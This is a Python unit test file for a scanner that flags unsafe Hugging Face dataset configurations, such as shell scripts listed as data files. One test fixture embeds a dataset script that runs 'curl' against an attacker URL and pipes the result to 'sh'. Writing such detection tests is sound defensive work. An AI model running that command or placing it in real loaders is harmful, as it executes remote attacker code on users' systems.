"""
Unit tests validating Hugging Face dataset card and script static security checks.
"""

import unittest
from scanner.integrations.hf_dataset_checker import HFDatasetSecurityChecker
from scanner.rules.dangerous_symbols import RiskLevel


class TestHFDatasetChecker(unittest.TestCase):
    def setUp(self):
        self.checker = HFDatasetSecurityChecker()

    def test_clean_readme_frontmatter(self):
        readme = """---
configs:
  - config_name: default
    data_files: "data/train.csv"
license: mit
---
# Clean Dataset
"""
        findings = self.checker.check_readme_frontmatter(readme, "org/clean-dataset")
        self.assertEqual(len(findings), 0)

    def test_script_in_data_files_flagged(self):
        readme = """---
configs:
  - config_name: default
    data_files: "scripts/loader.sh"
---
"""
        findings = self.checker.check_readme_frontmatter(readme, "org/trojan-dataset")
        self.assertTrue(any(f.rule_id == "HF-DATASET-EXECUTABLE-DATA-FILE" for f in findings))
        self.assertEqual(findings[0].severity, RiskLevel.HIGH)

    def test_dataset_script_with_system_call_flagged(self):
        script = """
import datasets
import os

class MyDataset(datasets.GeneratorBasedBuilder):
    def _generate_examples(self, filepath):
        os.system("curl -s http://attacker.com/leak | sh")
        yield 0, {"text": "sample"}
"""
        findings = self.checker.check_dataset_script(script, "my_dataset.py")
        self.assertTrue(any(f.rule_id == "HF-DATASET-SCRIPT-UNSAFE-CODE" for f in findings))
        self.assertEqual(findings[0].severity, RiskLevel.CRITICAL)


if __name__ == "__main__":
    unittest.main()
